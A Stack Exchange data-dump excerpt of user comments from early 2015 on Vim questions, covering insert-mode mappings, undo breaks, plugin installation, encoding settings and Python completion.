  <row Id="2116" PostId="2348" Score="0" Text="I have tried your code and it works however I have tried to edit it and I get a error with this code `inoremap &lt;CR&gt; &lt;C-R&gt;=((match(getline('.'), '\s*/\*')==-1) || (match(getline('.'), '\s*/\int')==-1))?';':''&lt;CR&gt;&lt;CR&gt;` The error is `empty buffer`. How would I solve it." CreationDate="2015-03-04T10:53:15.023" UserId="1168" />
  <row Id="2117" PostId="2341" Score="0" Text="@MichaelColes Very nice. It's always nice to know of alternatives. Not everyone here might agree, but I'd upvote that as an answer." CreationDate="2015-03-04T12:10:32.447" UserId="1111" />
  <row Id="2118" PostId="2341" Score="0" Text="@Rich: fair point :)" CreationDate="2015-03-04T12:12:48.643" UserId="646" />
  <row Id="2119" PostId="2342" Score="0" Text="@PeterRincker Thanks for the link. I'd upvote that if you'd post it as an answer." CreationDate="2015-03-04T12:15:24.037" UserId="1111" />
  <row Id="2122" PostId="119" Score="0" Text="See also: [How to edit files non-interactively (e.g. in pipeline)?](http://vi.stackexchange.com/q/788/467)" CreationDate="2015-03-04T12:34:30.883" UserId="467" />
  <row Id="2123" PostId="2341" Score="1" Text="@ChristopherBottoms I might too, especially if the answer pointed out the relation between sed and vi, and noted the similarities in some of the things you can do with them." CreationDate="2015-03-04T14:40:54.660" UserId="343" />
  <row Id="2125" PostId="2348" Score="0" Text="When I paste that in and replace `|` with `&lt;BAR&gt;` I get no errors. I assume the error is in another part of your vimrc. You can test this by temporarily replacing your vimrc with that one line and seeing if the problem persists. Perhaps you incorrectly tried to use `#` as a comment character?" CreationDate="2015-03-04T15:14:31.160" UserId="680" />
  <row Id="2126" PostId="2361" Score="4" Text="May also want to look at `:h :map-alt-keys` as another source of information" CreationDate="2015-03-04T17:02:07.620" UserId="778" />
  <row Id="2127" PostId="2348" Score="0" Text="Let us [continue this discussion in chat](http://chat.stackexchange.com/rooms/21644/discussion-between-apydeveloper-and-matt-boehm)." CreationDate="2015-03-04T17:20:09.450" UserId="1168" />
  <row Id="2130" PostId="2348" Score="0" Text="Here's what finally worked for me: `inoremap &lt;CR&gt; &lt;C-R&gt;=((match(getline('.'), '\s*/\*')==-1) &amp;&amp; (match(getline('.'), '\s*/int')==-1))?';':''&lt;CR&gt;&lt;CR&gt;`" CreationDate="2015-03-04T18:24:20.043" UserId="680" />
  <row Id="2131" PostId="2360" Score="0" Text="I knew that @muru would not resist to find the right script! Btw, would be better to add also the keywords from latex-suite dictionary..." CreationDate="2015-03-04T19:15:08.430" UserId="854" />
  <row Id="2132" PostId="2360" Score="1" Text="Done. It added 600+ words to the list from detexify. :)" CreationDate="2015-03-04T19:40:59.317" UserId="205" />
  <row Id="2133" PostId="2366" Score="0" Text="Thanks for mentioning my plugin; I was just about to recommend that as an alternative :-)" CreationDate="2015-03-04T20:54:30.520" UserId="970" />
  <row Id="2134" PostId="2366" Score="0" Text="Clever use of subscripting!" CreationDate="2015-03-04T22:00:23.290" UserId="142" />
  <row Id="2135" PostId="2370" Score="0" Text="Is that your entire vimrc file? `Plugin 'vimwiki'` looks like Vundle, but AFAIK you *need* to use `call vundle#begin()` and `call vundle#end()`..." CreationDate="2015-03-04T22:01:56.013" UserId="51" />
  <row Id="2136" PostId="2364" Score="1" Text="It might be useful, but I think this post is more suited to a comment, since it doesn't even come close to answering the question." CreationDate="2015-03-04T22:03:10.313" UserId="205" />
  <row Id="2137" PostId="2370" Score="0" Text="@Carpetsmoker No, it's not my entire vimrc :-). I've published only the settings that are related to vimwiki. Yes, I'm using Vundle to manage my plugins. Thanks for editing my question b.t.w. :-)." CreationDate="2015-03-04T22:06:36.420" UserId="1214" />
  <row Id="2138" PostId="2358" Score="0" Text="Complementary to this, there's [detexify](http://detexify.kirelabs.org/classify.html) for when you know how to draw a character but you don't remember the name of the command." CreationDate="2015-03-04T22:09:12.470" UserId="8" />
  <row Id="2139" PostId="2366" Score="5" Text="Could you please add an explanation?  I haven't seen this syntax before, and I would like to know how it works." CreationDate="2015-03-04T22:37:54.240" UserId="865" />
  <row Id="2140" PostId="2364" Score="0" Text="@muru Somehow it's approaching the same problem from a different side: We can not visualize the structure of the pattern in real time; Ok, but instead we visualize what the pattern does in real time. I take it as at least related enough to be an answer - and it may turn out to be pretty useful." CreationDate="2015-03-04T22:43:13.247" UserId="925" />
  <row Id="2142" PostId="2371" Score="0" Text="I'm using a standard qwerty layout. Just now tried starting without vimrc and the problem persists. Looked for mapping and it says no mapping found. You are correct, left and right work just fine. The behavior of up and down is somewhat sporadic. Sometimes it doesn't work at all. Other times, like right now, it jumps from the top of the file to the bottom of the file. The cursor never jumps higher than the last position it was at when going up,  and it always goes to the bottom left when going down." CreationDate="2015-03-05T02:21:46.713" UserId="1220" />
  <row Id="2143" PostId="2371" Score="0" Text="You might then try `:verbose :nmap j` to see if something else happened to clear it (this should say what last set `:nmap j`). Also, do `gj` and `gk` work? What if you enter visual mode first (type `v`) and then hit `j`, `k`, or `gj`, `gk`, or `&lt;UP&gt;`, `&lt;DOWN&gt;`?" CreationDate="2015-03-05T02:42:18.817" UserId="130" />
  <row Id="2144" PostId="2371" Score="0" Text="OK, verbose still yields no mapping found. Interestingly enough, gj and gk work in both normal and visual mode. Why is that?" CreationDate="2015-03-05T02:47:16.740" UserId="1220" />
  <row Id="2145" PostId="2330" Score="0" Text="I'll mark this as accepted since it technically answers my question. I do still have to set both values separately if I wanna change tabstop/shiftwidth values in a running instance of vim." CreationDate="2015-03-05T03:09:38.450" UserId="200" />
  <row Id="2146" PostId="2371" Score="0" Text="Just fixed it. Not sure why it doesn't work, but your advice about gj and gk gave me something to go on, and I found how to reverse Map the keys so that I can go line be line with just j and k And just several lines with gj and gk. Thank you so much! @mixedmath" CreationDate="2015-03-05T04:53:03.457" UserId="1220" />
  <row Id="2147" PostId="2366" Score="0" Text="@EvergreenTree The Vim variable 'v:searchforward' is 0 after a reverse search (e.g. '?') and 1 after a forward search (e.g. '/'). That is then used as the index to pick which letter ('n' or 'N') to use for the search. So, 'n' is mapped to 'N' if the search was reversed, but 'n' is mapped to 'n' for forward (e.g. it is left alone). The result is that 'n' will always search forward. The opposite is done for 'N'." CreationDate="2015-03-05T05:47:21.287" UserId="227" />
  <row Id="2148" PostId="2366" Score="1" Text="@EvergreenTree: Added some more explanation" CreationDate="2015-03-05T07:00:16.917" UserId="71" />
  <row Id="2149" PostId="2366" Score="0" Text="@IngoKarkat: I remembered your plugin from a similar question, so I mentioned it ;)" CreationDate="2015-03-05T07:01:17.267" UserId="71" />
  <row Id="2150" PostId="2371" Score="11" Text="It sounds like your file might be just a single line. In Vim, `k` and `j` go up and down one actual line, rather than one visible line. If your line wraps at 80 characters, and you have 100 characters, that is one line to Vim, even though it is displayed as two lines. `gk` and `gj` use display lines rather than actual lines, which is more in line (no pun intended) with what gui-based text editors do." CreationDate="2015-03-05T09:36:34.143" UserId="163" />
  <row Id="2152" PostId="2374" Score="0" Text="can you plz post your .vimrc file?" CreationDate="2015-03-05T11:36:59.117" UserId="342" />
  <row Id="2153" PostId="2371" Score="0" Text="Ah. Didn't know that. I am following along with a tutorial and I copied and pasted a paragraph from the PDF. So I suppose that could lose it's formatting in the crossover. I'll test for that. Changing back will be real easy. :-)" CreationDate="2015-03-05T11:48:52.680" UserId="1220" />
  <row Id="2154" PostId="2374" Score="0" Text="Thanks for the link to c.vim!" CreationDate="2015-03-05T12:05:33.057" UserId="1111" />
  <row Id="2155" PostId="2366" Score="0" Text="@ChristianBrabandt That is very clever.  I never thought of you using `v:searchforward` as an index." CreationDate="2015-03-05T12:40:26.933" UserId="865" />
  <row Id="2156" PostId="2376" Score="2" Text="There is probably something in your vimrc that does this. I can't replicate it, and can't find anything in the `:help` files about it ... See: [How do I debug my vimrc file?](https://vi.stackexchange.com/questions/2003/how-do-i-debug-my-vimrc-file?s=1|1.0009)... Also, using `&lt;C-c&gt;` to exit insert mode may have side-effects ([see this](http://stackoverflow.com/questions/5030164/whats-the-difference-between-ctrlc-and-ctrl/5036294#5036294)) and *may* be part of the problem ... I would suggest using `Esc` or `&lt;C-[&gt;` ([see this](http://vi.stackexchange.com/q/300/51))" CreationDate="2015-03-05T13:07:21.587" UserId="51" />
  <row Id="2157" PostId="2370" Score="0" Text="Okay :-) If you post a small snippet from a vimrc, you should probably test it, just to make sure that a) you can still reproduce the problem with it, and b) there are no errors in it :-) You can use `vim -u test-vimrc.vim` to use a different vimrc file." CreationDate="2015-03-05T13:15:34.360" UserId="51" />
  <row Id="2158" PostId="2374" Score="0" Text="I guess the tag should be more &quot;how do I install plugins&quot; that &quot;plugin-foobar&quot;." CreationDate="2015-03-05T13:43:12.653" UserId="626" />
  <row Id="2159" PostId="2375" Score="0" Text="It looks like there is actually a `~/.vim/doc/csupport.vim` file, so the first suggestion should be sufficient. There's definitely a lot of litter from this installation, though." CreationDate="2015-03-05T15:20:47.700" UserId="64" />
  <row Id="2160" PostId="2375" Score="0" Text="That's odd. I don't see it (neither in the official zip, nor on the github repo -- I'm not using c-support but another suite for C++ programming, thus this file may be auto-generated which could explain why I don't see it). I see a `&lt;localleader&gt;hp` mapping that builds the help database though." CreationDate="2015-03-05T15:39:07.547" UserId="626" />
  <row Id="2161" PostId="2377" Score="3" Text="Only problem is, you don't foresee that you are going to be undoing later (otherwise you won't be doing it in the first place). So you usually end up with a situation where you _wish_ you had used `&lt;C-G&gt;u`, which is too late already." CreationDate="2015-03-05T15:40:05.820" UserId="850" />
  <row Id="2162" PostId="2377" Score="0" Text="Of course. Luckily Vim has an arsenal of editing commands, so you don't have to rely on undo alone :)" CreationDate="2015-03-05T15:41:15.277" UserId="64" />
  <row Id="2163" PostId="2377" Score="3" Text="Yes. Actually something I have been missing myself is this. Sometimes I do this `i` followed by long sentence followed by backspace to remove part of what I have written (all in insert mode). Then I realize I shouldn't have backspaced and what I had written was fine. I undo, but then the whole inserted text gets undone. So either I am left with none of the long sentence, or the part that is not backspaced. It's impossible to get the backspaced part back. Is there a way to tell vim to break the undo sequence upon backspace? (Now that I say it, `map`ing backspace is an option of course)." CreationDate="2015-03-05T15:46:39.840" UserId="850" />
  <row Id="2164" PostId="2375" Score="0" Text="Oops, I meant `~/.vim/doc/csupport.txt`. I didn't check the link, but I see it in the directory tree provided in the question." CreationDate="2015-03-05T15:49:01.393" UserId="64" />
  <row Id="2165" PostId="2368" Score="0" Text="Side note: very useful for programmers is also `[[` and `]]` (as well as `[]` and `][`) to jump between beginning (and end) of functions." CreationDate="2015-03-05T15:53:24.730" UserId="850" />
  <row Id="2166" PostId="2378" Score="0" Text="Does your solution have to use public github repos or are private and/or self-hosted repos fine?" CreationDate="2015-03-05T16:06:15.567" UserId="7" />
  <row Id="2168" PostId="2375" Score="0" Text="Thanks. `:helptags ~/.vim/doc` worked for me!" CreationDate="2015-03-05T16:43:32.257" UserId="1168" />
  <row Id="2169" PostId="2375" Score="0" Text="Also what is it you use instead of c-support?" CreationDate="2015-03-05T16:48:49.150" UserId="1168" />
  <row Id="2170" PostId="2374" Score="0" Text="@elyashiv I only had `syntax on` and `set number`. Sorry i'm a bit late to replying! :)" CreationDate="2015-03-05T18:10:07.283" UserId="1168" />
  <row Id="2171" PostId="2378" Score="0" Text="I'd like to have it in public place, except the small fragments with passwords of course." CreationDate="2015-03-05T18:16:45.353" UserId="1067" />
  <row Id="2172" PostId="2377" Score="0" Text="Edited my answer to include a script to achieve the behaviour you described :)" CreationDate="2015-03-05T18:26:49.450" UserId="64" />
  <row Id="2173" PostId="2383" Score="0" Text="What would those consequences be? Dire?" CreationDate="2015-03-05T19:58:54.560" UserId="205" />
  <row Id="2174" PostId="2383" Score="0" Text="`encoding` is the internal encoding used for text strings everywhere in vim, so you cannot have any variables set that include characters not in the character set, load any files with characters it doesn't support, etc. Changing it mid-stream changes the meaning of any existing non-ascii values (including the contents of file buffers)." CreationDate="2015-03-05T20:00:16.770" UserId="880" />
  <row Id="2175" PostId="2383" Score="0" Text="Interesting! Could you add that to the answer as well?" CreationDate="2015-03-05T20:01:07.370" UserId="205" />
  <row Id="2176" PostId="2381" Score="0" Text="This could be a bug." CreationDate="2015-03-05T20:22:45.700" UserId="71" />
  <row Id="2177" PostId="2380" Score="0" Text="Are you using MacVim? Or Vim from a terminal?" CreationDate="2015-03-05T20:23:31.500" UserId="51" />
  <row Id="2178" PostId="2380" Score="0" Text="I am using terminal." CreationDate="2015-03-05T20:23:52.440" UserId="1168" />
  <row Id="2179" PostId="2381" Score="1" Text="I checked it in the source. This is done on purpose to make fillchars visible. Don't think there is a way around. I would probably make the statusline bold or use underline highlighting" CreationDate="2015-03-05T21:26:14.867" UserId="71" />
  <row Id="2180" PostId="2375" Score="1" Text="I'm using a suite of several plugins that I'm maintaining (https://code.google.com/p/lh-vim/wiki/lhCpp), some being poorly documented. This topic is not the best place to describe my suite." CreationDate="2015-03-05T21:41:01.213" UserId="626" />
  <row Id="2181" PostId="2200" Score="0" Text="Thanks for sharing this @LucHermitte. I've just updated the question to explain that I need to do this within an omni-completion script. Since I cannot change the context of the window, I don't think that this will work, right? Even trying to restore the window context through `pop` seems to fail." CreationDate="2015-03-05T21:51:39.257" UserId="599" />
  <row Id="2182" PostId="2200" Score="0" Text="OK. I've updated my answer." CreationDate="2015-03-05T21:57:36.087" UserId="626" />
  <row Id="2183" PostId="2384" Score="0" Text="Thanks. Will have a look tomorrow." CreationDate="2015-03-05T21:58:16.683" UserId="1168" />
  <row Id="2184" PostId="2382" Score="0" Text="You'll have to patch the templates coming from c-support or use another plugin which will propose other snippets." CreationDate="2015-03-05T21:59:01.853" UserId="626" />
  <row Id="2185" PostId="2377" Score="0" Text="So...any idea how OP ended up with the &quot;undo one character insertion&quot; behavior?" CreationDate="2015-03-06T02:10:18.687" UserId="1060" />
  <row Id="2186" PostId="2377" Score="0" Text="I'm guessing it's some mapping or autocmd in his vimrc. I'm not aware of a setting in Vim for such a thing." CreationDate="2015-03-06T02:12:50.447" UserId="64" />
  <row Id="2189" PostId="2377" Score="0" Text="Awesome! Am I permitted to copy?" CreationDate="2015-03-06T10:52:52.467" UserId="850" />
  <row Id="2190" PostId="2377" Score="1" Text="For future visitors, I also added `inoremap &lt;CR&gt; &lt;C-G&gt;u&lt;CR&gt;` so that each undo is contained within a single line (no more undoing the whole paragraph that you were typing nonstop)." CreationDate="2015-03-06T11:06:47.380" UserId="850" />
  <row Id="2191" PostId="2200" Score="0" Text="in my opinion the code you copied is not very helpful for the answer when compared to everything else and occupies much more area. Maybe you could keep only the link and leave the code out?" CreationDate="2015-03-06T11:11:57.923" UserId="599" />
  <row Id="2192" PostId="2394" Score="7" Text="I'm voting to close this question as off-topic because it is about the configuration of the Windows operating system." CreationDate="2015-03-06T11:28:53.203" UserId="13" />
  <row Id="2193" PostId="2382" Score="0" Text="Thanks, I have tried looking at the templates but I cannot find the one I like. Do you know where it is?" CreationDate="2015-03-06T11:32:56.173" UserId="1168" />
  <row Id="2194" PostId="2389" Score="0" Text="Oh well, Looks like I will map ll to / then. Thanks." CreationDate="2015-03-06T11:37:20.903" UserId="1168" />
  <row Id="2195" PostId="2382" Score="0" Text="IIRC, the documentation explains how to override a template. Search for &quot;local template&quot;. NB: You can also hack in to the templates packaged but it won't be a good idea." CreationDate="2015-03-06T12:28:55.130" UserId="626" />
  <row Id="2196" PostId="2200" Score="1" Text="That what I do usually, but SE policies don't appear as very tolerant towards link..." CreationDate="2015-03-06T12:30:35.727" UserId="626" />
  <row Id="2197" PostId="2394" Score="3" Text="http://superuser.com/a/13947/334516 - apparently someone got the answer from the Vim Wikia. :D" CreationDate="2015-03-06T12:44:13.463" UserId="205" />
  <row Id="2198" PostId="2347" Score="2" Text="Expanding on @Carpetsmoker's comment, beware that automatic `;` insertion could even be dangerous if it is not perfect (and no code is perfect).  Imagine the following confusing set of lines: `if (this &gt; is` followed by `&amp;&amp; a + /* check */` followed by `that * is_very(important |` followed by `security | wise))` followed by `do_something();`. If your automatic `;` insertion makes a mistake and puts a `;` at the end of the `if`, then you immediately get a hard-to-detect security bug." CreationDate="2015-03-06T13:23:22.477" UserId="850" />
  <row Id="2199" PostId="2348" Score="0" Text="First, see [my comment on the question](http://vi.stackexchange.com/questions/2347/how-do-i-automatically-add-a-character-at-end-of-line#comment2198_2347). That said, they very minimum you should do to bypass any trivial bugs is to **try not to parse with regexes**. Regexes are not powerful enough to parse a context-free grammar such as C's. That is assuming no macro wizardry either." CreationDate="2015-03-06T13:26:36.320" UserId="850" />
  <row Id="2200" PostId="2347" Score="1" Text="Furthermore, sometimes this is even impossible to know without actually trying to compile the code. Imagine someone doing this for whatever strange reason: `#define UNTIL(x) while (!(x))`. Then when you write `UNTIL(out_of_bounds)`, it's impossible to know if that's a function call and therefore needs a terminating `;` or a macro that expands to `while` and therefore doesn't need a terminating `;`. If you do insert the `;`, you are in trouble." CreationDate="2015-03-06T13:29:44.717" UserId="850" />
  <row Id="2201" PostId="2347" Score="2" Text="In short, if it were possible to unambiguously understand where there should be a `;`, they wouldn't have added `;` to the language now, would they? ;) Since that's not possible, you can't have a program that correctly inserts it for you either." CreationDate="2015-03-06T13:31:35.807" UserId="850" />
  <row Id="2202" PostId="2347" Score="0" Text="Looks like I wont use this then unless I tell the script to **only** insert at the end of line with the conditions. Thanks for letting me know!" CreationDate="2015-03-06T13:31:54.180" UserId="1168" />
  <row Id="2203" PostId="2388" Score="0" Text="well, it does say the error is in the `viminfo`..." CreationDate="2015-03-06T14:20:40.147" UserId="342" />
  <row Id="2205" PostId="2385" Score="0" Text="I use various background colors for terminals that all rely on the same .vimrc, so unfortunately setting a specific color wouldn't be any better (unless I can set it to &quot;whatever is being used for the bg&quot;). &#xA;&#xA;Looks like I'll just have to settle for bold or underlined then." CreationDate="2015-03-06T15:52:18.070" UserId="1166" />
  <row Id="2206" PostId="2396" Score="1" Text="The output actually makes me think you have a double-quoting issue. For debugging purposes, it may be useful for you to edit vimdiff.bat and remove the @echo off line at the top. Then edit the question with the output of running vimdiff, which should hopefully provide more details about where in the batch file the problem happens." CreationDate="2015-03-06T17:01:53.910" UserId="72" />
  <row Id="2207" PostId="2393" Score="0" Text="I have +1ed your comment since it is useful to know however I have not marked this as the answer because it is not automatically adding a semicolon to the end of the line. Thanks for the suggestion though." CreationDate="2015-03-06T17:46:55.867" UserId="1168" />
  <row Id="2209" PostId="2399" Score="2" Text="Have you ever tried https://github.com/gmarik/Vundle.vim or https://github.com/tpope/vim-pathogen?" CreationDate="2015-03-06T18:13:09.253" UserId="865" />
  <row Id="2211" PostId="2394" Score="2" Text="This is a useful question as such, but I agree with @toro2k that this question belongs on SuperUser.com. It has almost nothing to do with Vim." CreationDate="2015-03-06T19:44:34.007" UserId="51" />
  <row Id="2212" PostId="2399" Score="0" Text="No I haven't. Only started using vim 1-2 days ago." CreationDate="2015-03-06T20:33:20.467" UserId="1168" />
  <row Id="2213" PostId="2388" Score="0" Text="It does, but it says `viminfo`, not `.viminfo` or `~/.viminfo`, so as someone who didn't even know that that file existed, it looked more like a generic tag than a filename." CreationDate="2015-03-06T21:12:53.397" UserId="1079" />
  <row Id="2214" PostId="2385" Score="0" Text="&quot;whatever is being used for the bg&quot; That is possible. Use 'ctermbg=bg' this works, if your Vim knows the current bg color otherwise you might get an error." CreationDate="2015-03-06T21:35:26.950" UserId="71" />
  <row Id="2215" PostId="2396" Score="0" Text="How exactly are you invoking vimdiff, as well? Also see http://superuser.com/questions/697847/cant-run-vimdiff-7-4-on-windows-7" CreationDate="2015-03-06T23:30:57.937" UserId="1094" />
  <row Id="2216" PostId="2395" Score="0" Text="I think you can also use regedit to add these to your own personal area, without admin rights. See http://vim.wikia.com/wiki/Windows_file_associations" CreationDate="2015-03-06T23:46:32.120" UserId="1094" />
  <row Id="2217" PostId="2398" Score="0" Text="Awesome! These solutions work perfect." CreationDate="2015-03-07T01:35:26.847" UserId="544" />
  <row Id="2219" PostId="2403" Score="1" Text="*&quot;How come an unmaintained plugin is the only choice at the moment for code completion for such an important programming language*&quot; -&gt; There are almost no Python 3-only projects, almost all Python programs run fine on Python 2 &amp; 3, so Python 2 completion should be good for almost everyone." CreationDate="2015-03-07T04:31:31.887" UserId="51" />
  <row Id="2220" PostId="2403" Score="0" Text="Agreed with @Carpetsmoker. Vim comes with Python completion out of the box, and it works wonders with Python3 as well. In fact, the default pythoncomplete that comes built in to Vim is what I use. No YCM, no Jedi-vim, no Python-mode. See my answer if you still want +python3" CreationDate="2015-03-07T04:44:14.970" UserId="246" />
  <row Id="2221" PostId="2404" Score="0" Text="Thanks for your quick answer. I was able to build vim with +python3/dyn and +python/dyn support. But that does not solve my problem. As soon as I start vim, YouCompleteMe starts (which always starts python2 as far as I know). When I enter `:echo has('python3')` I get `0`, whereas `:echo has('python')` returns `1`. I have the following options in my .vimrc, but they don't help: `let g:ycm_path_to_python_interpreter = '/usr/bin/python3 let g:ycm_filetype_specific_completion_to_disable = { 'python' : 1 } let g:ycm_filetype_blacklist = { 'python' : 1 }`." CreationDate="2015-03-07T05:41:45.190" UserId="1256" />
  <row Id="2222" PostId="2403" Score="0" Text="I just checked out pythoncomplete, I didn't know that this script is included in a normal vim installation. That is definetely a nice basic option. Do you happen to know an easy way for pythoncomplete to add brackets to functions call (e.g. print(''))?" CreationDate="2015-03-07T06:05:25.570" UserId="1256" />
  <row Id="2223" PostId="2285" Score="1" Text="Try `:keeppatterns` to prevent overriding `@/`. And also take a look at `:keepjumps`." CreationDate="2015-03-07T06:14:13.823" UserId="1242" />
  <row Id="2224" PostId="2403" Score="0" Text="I think you would have to modify that yourself. The source is available here on vim.org: http://www.vim.org/scripts/script.php?script_id=1542. Admittedly, it is pretty old, but it works pretty well for me." CreationDate="2015-03-07T09:12:38.893" UserId="246" />
  <row Id="2225" PostId="2404" Score="0" Text="For step 1, I recommend instead: `apt-get build-dep vim`" CreationDate="2015-03-07T11:21:03.243" UserId="24" />
  <row Id="2226" PostId="2404" Score="0" Text="@200_success, I'm not sure if that also pulls down the x11 stuff needed for clipboard support. I don't have a linux machine with me to check though." CreationDate="2015-03-07T11:24:18.673" UserId="246" />
  <row Id="2227" PostId="2404" Score="0" Text="From https://packages.debian.org/jessie/vim, see the `.dsc` file linked in the sidebar. I believe all of the packages you suggested, except `mercurial`, are either directly or transitively listed as `Build-Depends`. In particular, [`libgnomeui-dev`](https://packages.debian.org/jessie/libgnomeui-dev) is  probably responsible for many of those dependencies." CreationDate="2015-03-07T11:37:51.037" UserId="24" />
  <row Id="2228" PostId="2404" Score="0" Text="@200_success, fair enough, thanks! Updated the post." CreationDate="2015-03-07T11:41:52.993" UserId="246" />
  <row Id="2229" PostId="2403" Score="0" Text="https://github.com/klen/python-mode" CreationDate="2015-03-07T14:21:30.407" UserId="1262" />
  <row Id="2230" PostId="2382" Score="0" Text="I have looked at the local template in search however I am not sure what to do. Could you give me the instructions please?" CreationDate="2015-03-07T15:44:50.067" UserId="1168" />
  <row Id="2233" PostId="2396" Score="0" Text="@JoshPetrie I don't have a diff.bat file, just a diff.exe and a few .vim and .txt files." CreationDate="2015-03-07T17:08:03.363" UserId="342" />
  <row Id="2234" PostId="2413" Score="0" Text="If you do this a lout you can create a key binding." CreationDate="2015-03-07T17:24:46.480" UserId="342" />
  <row Id="2235" PostId="2418" Score="0" Text="(t)csh alias: `alias vimhelp 'vim -c ':help $1' -c :only'`" CreationDate="2015-03-07T17:51:39.633" UserId="51" />
  <row Id="2236" PostId="2418" Score="3" Text="@Carpetsmoker Did you find a time machine to go back to the late 1980s/early 1990s, the time when tcsh was worth using? Can you share?" CreationDate="2015-03-07T17:53:11.313" UserId="8" />
  <row Id="2237" PostId="2413" Score="2" Text="In this literal example, it seems easiest to me to do `}i`, which is &quot;go to the end of the paragraph&quot; and &quot;enter insert mode&quot;. But in general, I would do `]}o` as you mention, because in the midst of coding I often don't mind the (one) extra keystroke if I spend 0 seconds thinking about it." CreationDate="2015-03-07T18:08:36.770" UserId="130" />
  <row Id="2239" PostId="2419" Score="0" Text="Are you using Vim from a terminal? Control+S is also a special keybind picked up by the terminal which means &quot;stop output&quot;... When I try the above 2 keybinds from gVim, it seems to work." CreationDate="2015-03-07T18:45:33.803" UserId="51" />
  <row Id="2240" PostId="2419" Score="0" Text="'`I am also running vim inside the Mac terminal.`' Yes I am running vim via terminal. Would it be better using Alt instead of Ctrl or Cmd?" CreationDate="2015-03-07T18:50:19.390" UserId="1168" />
  <row Id="2241" PostId="2419" Score="0" Text="[This question has been asked many times](https://duckduckgo.com/?q=Vim%20Mapping%20Ctrl%2Bs%20does%20not%20work), by the way ;-) I don't have time to write an answer, but that link should help you..." CreationDate="2015-03-07T18:54:14.060" UserId="51" />
  <row Id="2242" PostId="2421" Score="0" Text="`This is a bug in Vim;`  Actually, it's a bug in the _vimrc being installed by your installer.  At a guess, that's probably the [Vim without Cream](http://sourceforge.net/projects/cream/files/Vim/) installer.  The problem should be reported there." CreationDate="2015-03-07T20:15:02.803" UserId="15" />
  <row Id="2243" PostId="2421" Score="0" Text="@jamessan I downloaded the Vim installer from the vim.org site at http://www.vim.org/download.php ... I don't know anything about Cream. It seems to me that the `_vimrc` file that this installer installs is part of Vim?" CreationDate="2015-03-07T20:22:06.507" UserId="51" />
  <row Id="2244" PostId="2382" Score="0" Text="Sorry. I can't do more. So far, I've just grasped hints of a solution from the documentation -- and the way template expander could be implemented. As I said  in another Q/A, I'm not using c-support as I'm maintaining a concurrent C++ suite -- which would expand `main&lt;c-space&gt;` into something closer to what you are looking for, and if not, this time I'll know how to override `cpp/main` snippet." CreationDate="2015-03-07T20:59:22.737" UserId="626" />
  <row Id="2246" PostId="2421" Score="0" Text="Ah, well that's why it's generally recommended to get the 'Vim without Cream' installer on Windows. :) It is regularly rebuilt whereas the Windows installer from vim.org is usually only built for major releases.  This bug was fixed in 2013, but the vim.org installer doesn't have the fix." CreationDate="2015-03-07T23:40:20.520" UserId="15" />
  <row Id="2247" PostId="2414" Score="0" Text="Why not `z]a}`?" CreationDate="2015-03-08T05:23:29.360" UserId="15" />
  <row Id="2248" PostId="2424" Score="0" Text="If there is no need for a `MyDiff` function, why does it exist?" CreationDate="2015-03-08T06:42:22.153" UserId="342" />
  <row Id="2249" PostId="531" Score="0" Text="EasyMotion is absolutely mindblowing!" CreationDate="2015-03-08T10:32:04.400" UserId="1056" />
  <row Id="2250" PostId="2419" Score="0" Text="To bind save to Cmd-S on OSX you could try mapping from `&lt;D-s&gt;` although I'm not sure if that works in terminal Vim, and it is already a default in MacVim anyway!" CreationDate="2015-03-08T10:41:10.233" UserId="630" />
  <row Id="2251" PostId="2414" Score="0" Text="Because `a}` is a characterwise motion. The operators will work like `i` / `a` for characterwise, and `o` / `O` for linewise. You could use `z]Va}` to force `a}` to be linewise." CreationDate="2015-03-08T14:13:01.357" UserId="64" />
  <row Id="2253" PostId="2428" Score="2" Text="It appears that ctrlp can accept a custom matching function.  It is in the documentation under `'g:ctrlp_match_func`  A good example of this in use is this plugin: http://www.vim.org/scripts/script.php?script_id=4884" CreationDate="2015-03-08T16:47:55.453" UserId="865" />
  <row Id="2254" PostId="2135" Score="3" Text="@MattBoehm That patch was applied upstream as 7.4.658. :)" CreationDate="2015-03-08T17:52:27.083" UserId="15" />
  <row Id="2255" PostId="2358" Score="0" Text="I'm planning to add such a feature to [vimtex](https://github.com/lervag/vimtex), based on the dictionary completion as used by for instance `latex-suite`. `vimtex` is a relatively new plugin and is based on LaTeX-Box, so it should feel somewhat familiar." CreationDate="2015-03-08T17:55:27.957" UserId="21" />
  <row Id="2257" PostId="2418" Score="0" Text="@Gilles some people still post questions about it on AU/U&amp;L - corporate environments, I suppose. :(" CreationDate="2015-03-08T18:33:20.190" UserId="205" />
  <row Id="2258" PostId="2429" Score="0" Text="&quot;a file&quot;? Which file? The one in the current buffer? A file somewhere in the search path?" CreationDate="2015-03-08T22:12:44.863" UserId="205" />
  <row Id="2260" PostId="2429" Score="0" Text="The file that the user open via `vim &lt;file name&gt;" CreationDate="2015-03-08T22:35:50.340" UserId="1168" />
  <row Id="2261" PostId="2429" Score="0" Text="possible duplicate of [How can I see the full path of the current file?](http://vi.stackexchange.com/questions/104/how-can-i-see-the-full-path-of-the-current-file)" CreationDate="2015-03-08T22:37:20.630" UserId="51" />
  <row Id="2262" PostId="2429" Score="0" Text="I don't want the full path. I only want the name and extension of the file. Not the path I also want to use this in vimscript." CreationDate="2015-03-08T22:40:02.643" UserId="1168" />
  <row Id="2263" PostId="2429" Score="0" Text="Yes, both answers are actually in the linked question (specifically, CharlesL's answer)..." CreationDate="2015-03-09T00:32:11.697" UserId="51" />
  <row Id="2264" PostId="2433" Score="2" Text="Thank you. So I guess the fastest way to do this is `vim .`." CreationDate="2015-03-09T01:10:04.520" UserId="356" />
  <row Id="2266" PostId="2434" Score="0" Text="@Carpetsmoker I don't totally understand my [link](http://vim.wikia.com/wiki/Printing_using_kprinter) above, but I thought perhaps that it was piping the &quot;hardcopy&quot; postscript file to KDE's print interface. Hence, I thought that my question wasn't so much about Vim being compatible with KDE, but more about finding the right KDE component to receive the hardcopy." CreationDate="2015-03-09T02:23:44.603" UserId="1278" />
  <row Id="2268" PostId="2435" Score="0" Text="Seems like a reasonable solution (+1), but is there no solution with the core (or semi-core) KDE packages? I read that [kprinter](https://liquidat.wordpress.com/2014/02/18/kprinter-available-for-kde-4/) has been replaced by a qt/kde-specific program, but presumably my gtk apps use another frontend." CreationDate="2015-03-09T02:43:07.377" UserId="1278" />
